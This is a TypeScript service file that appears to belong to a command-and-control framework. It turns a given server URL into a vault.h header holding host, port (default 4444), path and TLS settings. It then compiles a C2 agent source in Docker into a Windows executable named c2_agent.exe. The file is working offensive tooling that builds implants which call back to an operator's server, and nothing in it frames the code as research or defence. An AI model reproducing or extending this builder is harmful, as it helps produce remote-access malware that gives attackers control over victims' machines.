import { execFile } from "child_process";
import { promisify } from "util";
import fs            from "fs";
import path          from "path";
import type { IC2Compiler, C2BuildResult } from "../../../domain/ports/IC2Compiler.js";
import { Result }    from "../../../shared/Result.js";

const execFileAsync = promisify(execFile);

const C2_DIR = path.resolve(process.cwd(), "compiler", "c2");
const SRC    = path.join(C2_DIR, "c2_agent.cpp");

export class C2CompilerService implements IC2Compiler {
  async compile(serverUrl: string): Promise<Result<C2BuildResult>> {
    const buildId = String(Date.now());
    const folder  = path.join(C2_DIR, "builds", buildId);

    try {
      fs.mkdirSync(folder, { recursive: true });

      if (!fs.existsSync(SRC)) {
        return Result.fail(`c2_agent.cpp não encontrado em: ${SRC}`);
      }

      const parsed = this._parseUrl(serverUrl);
      if (!parsed) {
        return Result.fail(`URL inválida: ${serverUrl}`);
      }

      const vaultH = [
        "#ifndef VAULT_H",
        "#define VAULT_H",
        "",
        `#define SERVER_HOST "${parsed.host}"`,
        `#define SERVER_PORT ${parsed.port}`,
        `#define SERVER_PATH "${parsed.path}"`,
        `#define SERVER_TLS ${parsed.tls ? 1 : 0}`,
        `#define SERVER_DEBUG 1`,
        "",
        "#endif",
      ].join("\n");

      fs.writeFileSync(path.join(folder, "vault.h"), vaultH);
      fs.copyFileSync(SRC, path.join(folder, "c2_agent.cpp"));

      await execFileAsync("docker", [
        "run", "--rm",
        "-v", `${folder}:/build`,
        "c2-compiler",
      ], { cwd: folder, timeout: 60000 });

      const binaryPath = path.join(folder, "c2_agent.exe");
      if (!fs.existsSync(binaryPath)) {
        return Result.fail("Compilação concluiu mas c2_agent.exe não foi encontrado");
      }

      return Result.ok({ binaryPath, buildId });

    } catch (e: unknown) {
      try { fs.rmSync(folder, { recursive: true, force: true }); } catch {  }
      const msg = e instanceof Error ? e.message : String(e);
      return Result.fail(`Erro na compilação C2: ${msg}`);
    }
  }

  private _parseUrl(url: string): { host: string; port: number; path: string; tls: boolean } | null {
    try {
      let normalized = url.trim();
      if (!normalized.startsWith("ws://") && !normalized.startsWith("wss://") &&
          !normalized.startsWith("http://") && !normalized.startsWith("https://")) {
        normalized = "ws://" + normalized;
      }
      const isSecure = url.startsWith("wss://") || url.startsWith("https://");
      normalized = normalized
        .replace(/^wss:\/\//, "https://")
        .replace(/^ws:\/\//, "http://");
      if (!normalized.startsWith("http")) {
        normalized = "http://" + normalized;
      }
      const u = new URL(normalized);
      const defaultPort = isSecure ? 443 : 4444;
      return {
        host: u.hostname,
        port: u.port ? parseInt(u.port, 10) : defaultPort,
        path: u.pathname || "/",
        tls: isSecure,
      };
    } catch {
      return null;
    }
  }
}

